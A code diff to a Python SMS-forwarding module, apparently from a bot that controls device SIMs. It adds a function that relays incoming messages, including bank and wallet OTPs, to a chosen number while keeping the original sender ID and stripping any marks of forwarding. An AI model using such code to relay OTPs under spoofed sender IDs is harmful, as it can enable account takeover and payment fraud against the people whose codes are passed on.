@@ -30,6 +30,27 @@ def parse_channel_outgoing(text: str) -> tuple[str | None, str | None]:
     return None, None
 
 
+def prepare_sms_forward(sender: str, message: str) -> tuple[str, str]:
+    """Pass SMS through unchanged for /mynum inject — no labels, no sender prefix."""
+    clean_sender = sender.strip()
+    clean_message = message.strip()
+
+    # If a formatted bot/channel post was re-fed, unwrap to raw body only.
+    if re.search(r"(?:From|FROM|Sender)\s*:", clean_message, re.I):
+        parsed_sender, parsed_body = parse_channel_message(clean_message)
+        if parsed_body:
+            clean_message = parsed_body.strip()
+        if parsed_sender:
+            clean_sender = parsed_sender.strip()
+
+    # Never prepend sender into SMS body (e.g. "AX-PAYTM-S: OTP...").
+    sender_prefix = f"{clean_sender}:"
+    if clean_message.startswith(sender_prefix):
+        clean_message = clean_message[len(sender_prefix) :].lstrip()
+
+    return clean_sender, clean_message
+
+
 def parse_channel_message(text: str) -> tuple[str | None, str]:
     cleaned = text.strip()
     sender = None
@@ -60,11 +81,13 @@ def queue_forward_to_mynum(
     sender: str,
     message: str,
 ) -> OutboundSMS:
-    """Forward incoming SMS to /mynum keeping original sender ID."""
+    """Forward incoming SMS to /mynum — exact sender ID + body, nothing extra."""
     from app.services import normalize_phone
 
     if not profile.phone_number:
         raise ValueError("Pehle /mynum <number> set karo")
+
+    sender, message = prepare_sms_forward(sender, message)
 
     sims = get_sim_list(device)
     sim_index = profile.selected_sim_index or 0
